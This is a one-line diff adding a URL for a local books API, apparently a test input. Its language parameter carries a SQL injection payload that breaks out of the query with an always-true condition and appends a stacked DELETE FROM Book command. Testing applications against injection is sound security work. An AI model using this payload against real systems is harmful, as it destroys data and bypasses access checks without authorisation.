@@ -1,0 +1,1 @@
+http://localhost:8080/api/books/?from=1900&to=2000&lang=es' or '1' = '1'; DELETE FROM Book  --
